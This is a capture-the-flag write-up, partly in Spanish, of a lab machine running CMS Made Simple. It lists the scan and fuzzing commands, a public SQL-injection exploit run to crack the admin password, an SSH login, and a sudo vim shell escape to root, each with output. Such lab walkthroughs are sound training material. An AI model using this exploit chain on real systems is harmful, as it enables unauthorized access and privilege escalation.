
#### How many services are running under port 1000?
2
### What is running on the higher port?
ssh

```
nmap -sV -p- --min-rate 5000 -v 10.10.60.145 -oN nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 14:11 CDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 14:11
Scanning 10.10.60.145 [4 ports]
Completed Ping Scan at 14:11, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:11
Completed Parallel DNS resolution of 1 host. at 14:11, 0.08s elapsed
Initiating SYN Stealth Scan at 14:11
Scanning 10.10.60.145 [65535 ports]
Discovered open port 21/tcp on 10.10.60.145
Discovered open port 80/tcp on 10.10.60.145
Discovered open port 2222/tcp on 10.10.60.145
Completed SYN Stealth Scan at 14:12, 26.78s elapsed (65535 total ports)
Initiating Service scan at 14:12
Scanning 3 services on 10.10.60.145
Completed Service scan at 14:12, 6.40s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.60.145.
Initiating NSE at 14:12
Completed NSE at 14:12, 0.79s elapsed
Initiating NSE at 14:12
Completed NSE at 14:12, 0.74s elapsed
Nmap scan report for 10.10.60.145
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.23 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 38 (3.200KB)

```

### What's the CVE you're using against the application?

- Buscamos directorios en el sitio web

```
ffuf -u http://10.10.60.145/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -ic 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.60.145/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 4429ms]
simple                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 179ms]

```

- Encontramos en el sitio web> Simple cms
- La version esta abajo en la esquina inferior derecha de la web

```
searchsploit simple cms 2.2.8
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                   | php/webapps/46635.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


### To what kind of vulnerability is the application vulnerable?
sqli

### What's the password?

```
python2 46635.py -u http://10.10.31.228/simple --crack -w  /usr/share/wordlists/rockyou.txt


[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

```

#### Where can you login with the details obtained?

- nos logueamos en el portal

```
ffuf -u http://10.10.31.228/simple/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.31.228/simple/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

modules                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 184ms]
uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 178ms]
doc                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 182ms]
admin                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 186ms]
assets                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 184ms]
                        [Status: 200, Size: 19913, Words: 2945, Lines: 127, Duration: 3821ms]
lib                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 181ms]
tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 181ms]
:: Progress: [3385/220547] :: Job [1/1] :: 276 req/sec :: Duration: [0:00:15] :: Errors: 0 :::: Progress: [3400/220547] :: Job [1/1] :: 348 req/sec :: Duration: [0:00:15] :: Errors: 51 :[WARN] Caught keyboard interrupt (Ctrl-C)

```

. nos logueamos en

ssh

#### What's the user flag?

```
ssh mitch@10.10.31.228 -p 2222 
The authenticity of host '[10.10.31.228]:2222 ([10.10.31.228]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.31.228]:2222' (ED25519) to the list of known hosts.
mitch@10.10.31.228's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!

```


#### Is there any other user in the home directory? What's its name?

```
cd /home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath

```

#### What can you leverage to spawn a privileged shell?

```

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

sudo /usr/bin/vim


>> escapar del vim

:set shell=/bin/bash
shell

root@Machine:/home# cd /root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt
W3ll d0n3. You made it!



```


```
cat ForMitch.txt  
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```